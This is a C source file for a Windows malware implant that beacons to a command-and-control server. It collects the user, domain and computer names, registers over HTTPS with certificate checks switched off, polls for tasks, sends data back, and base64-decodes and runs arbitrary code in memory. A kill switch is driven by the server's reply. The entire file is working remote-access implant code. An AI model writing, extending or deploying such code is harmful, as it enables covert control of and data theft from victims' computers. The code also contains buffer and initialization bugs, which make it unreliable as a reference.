// platform specific headers needed so we can function

#include <stdio.h>

// so we can parse the json data

#include "../lib/json-c/json.h"

// local 

#include "base64.h"
#include "compression.h"

#ifdef WIN

    // use our windows dpendencies

    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>
    #include <winhttp.h>
    #include <lm.h>

#endif

// core header file

#include "core.h"

// core functions

BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
{

    /* get basic infomation about how the current user is running */

    #define INFO_BUFFER_SIZE 32767

    DWORD dwUserBuf = 256;
    char chCurrentUser[256];
    LPSTR DomainBuf[MAX_PATH], ComputerBuf[MAX_PATH];
    DWORD bufSize2, bufSize3 = UNLEN+1;

    // set username

    GetUserName(chCurrentUser, &dwUserBuf);
    UserInfo->UserName = chCurrentUser;

    // set the domain

    ZeroMemory(DomainBuf, MAX_PATH);
    GetComputerNameEx( ComputerNameDnsDomain, DomainBuf, &bufSize2 );
    UserInfo->DomainName = DomainBuf;

    if (strlen(UserInfo->DomainName) == 0)
    {
        UserInfo->DomainName = "NULL";
    }
    
    // set the computer name

    GetComputerNameA( ComputerBuf, &bufSize3 );
    UserInfo->ComputerName = ComputerBuf;

    return TRUE;
}

LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
{   

    // get the 'alive' parameter of the json data and if its false... die

    struct json_object *parsed_json;

    parsed_json = json_tokener_parse(ReadBuffer);
    parsed_json = json_object_object_get(parsed_json, "alive");
    
    if (parsed_json != NULL)
    {
        if (!json_object_get_boolean(parsed_json))
        {
            DieCleanly();
        }
    }

}

LPVOID DieCleanly()
{
    // not much to say bout this lol
    exit(1);
}

BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize)
{

    /* callback and register this beacon with the C2 */

    // init some important variables

    BOOL                bResults = FALSE;
    DWORD               flags;
    CHAR                ReadBuffer[dwSize + 1];
    DWORD               dwDownloaded = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    struct json_object *parsed_json;

    // initiate the session

    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        return FALSE;
    }

    // do the connection

    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        // again, we cant do nothin so just go again later
        return FALSE;
    }

    // set up the request

    hRequest = WinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        // you get the idea by now
        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked

    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        // guess what...
        return FALSE;
    }

    // finally send the actual request to the c2

    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);

    // make sure the request was successful
    if (bResults)
    {       
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // no lets get the session id

    if (bResults)
    {
        do
        {
            
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
            {
                // Theres no data avalible
                return FALSE;
            }

            if (!WinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
            {                                  
                // been an error
                return FALSE;
            }

        } while (dwSize > 0);
        
    }
    
    // clean up the buffer so its parseable

    ReadBuffer[57] = '\0';

    // clean up the request stuffs now we are done with it.

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    // now its time to parse the json data in the responce

    parsed_json = json_tokener_parse(ReadBuffer);

    // get the id and store it in the idbuffer
    parsed_json = json_object_object_get(parsed_json, "id");
    strcpy(IdBuffer, json_object_get_string(parsed_json));

    // now check we dont need to kill ourselves
    CheckIfDie(&ReadBuffer);

    return TRUE;
}

LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
{
    /*
    Build the reply to the C2 containing any data we need to send back
    */

    struct json_object *jobj;

    // init the json object
    jobj = json_object_new_object();

    // create the id buffer
    json_object_object_add(jobj, "id", json_object_new_string(IdBuffer));

    // add the correct data to the json data
    switch (Mode)
    {
    case MODE_CHECKIN_NO_DATA:
    
        // dont add any data  
        break;
    
    case MODE_CHECKIN_DATA:

        // add the opcode and data to the json data
        json_object_object_add(jobj, "opcode", json_object_new_int64(OpCode));
        json_object_object_add(jobj, "data", json_object_new_string(Data));

        break;
    
    default:
        break;
    }

    // return the formated data
    return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
}

LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
{
    /* callback to the c2 and check for a task or deliver data*/

    // init some important variables for are callback

    LPCWSTR*            ResBuffer;
    BOOL                bResults = FALSE;
    DWORD               dwAvailableBytesToRead = 0;
    HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
    LPCSTR*             UriBuffer;
    DWORD               flags;

    struct json_object *parsed_json;

    // check if we doing a normal checkin or sending data

    if (SendBuffer == NULL && SendOpCode == NULL)
    {
        UriBuffer = (LPCSTR*)malloc(5000);
    } else {
        UriBuffer = (LPCSTR*)malloc(SendBufferSize * 2);
    }

    // initiate the session

    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        // not really alot we can do about this, guess we just return and try again later...
        return FALSE;
    }

    // do the connection

    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);

    if (!hConnect)
    {
        // again, we cant do nothin so just go again later
        return FALSE;
    }

    // set up the request

    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        // you get the idea by now
        return FALSE;
    }

    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked

    flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
    {
        // guess what...
        return FALSE;
    }

    // build the data for the request

    memset(UriBuffer, '\0', strlen(UriBuffer));

    if (SendOpCode != NULL)
    {
        UriBuffer = BuildCheckinData(SendOpCode, SendBuffer, MODE_CHECKIN_DATA);
    } else {
        UriBuffer = BuildCheckinData(NULL, NULL, MODE_CHECKIN_NO_DATA);
    }

    // finally send the actual request to the c2

    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);

    // make sure the request was successful

    if (bResults)
    {       
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {  
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        LPSTR pszOutBuffer;

        ResBuffer = "";

        do 
        {
            // check how much available data there is

            dwSize = 0;
            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
            {
                printf( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                break;
            }
            
            // out of data

            if (!dwSize)
            {
                break;
            }

            // allocate space for the buffer

            pszOutBuffer = (LPSTR)malloc(dwSize+1);

            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                break;
            }
            
            // read all the data

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
            {                                  
                // been an error
                return FALSE;
            }
            else
            {
                asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
            }
        
            // free the memory allocated to the buffer.

            free(pszOutBuffer);
                
        } while (dwSize > 0);
    }

    // check if we need to die
    CheckIfDie(ResBuffer);

    // get the opcode

    parsed_json = json_tokener_parse(ResBuffer);
    parsed_json = json_object_object_get(parsed_json, "task");
    *OpCode     = json_object_get_int(parsed_json);

    parsed_json = json_tokener_parse(ResBuffer);
    parsed_json = json_object_object_get(parsed_json, "args");
    if (parsed_json != NULL)
    {
        return json_object_get_string(parsed_json);
    }

    return NULL;
}

BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
{
    unsigned char shellcode[] = {0};
    size_t out_len   = strlen(Base64Buffer) + 1;
    size_t b64_len   = b64_decoded_size(Base64Buffer);
    char*  b64_out   = (char*)malloc(out_len);

    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);    

    DEBUG("Calling ExecuteMemory");

    switch (CodeType)
    {
    case TRUE:
        // execute module
        return ExecuteMemory(b64_out, b64_len, TRUE);
    
    case FALSE:
        // execute arbitary user code
        return ExecuteMemory(b64_out, b64_len, FALSE);
    
    default:
        return FALSE;
    }
}

LPVOID ReportExecutionFail()
{
    return;
}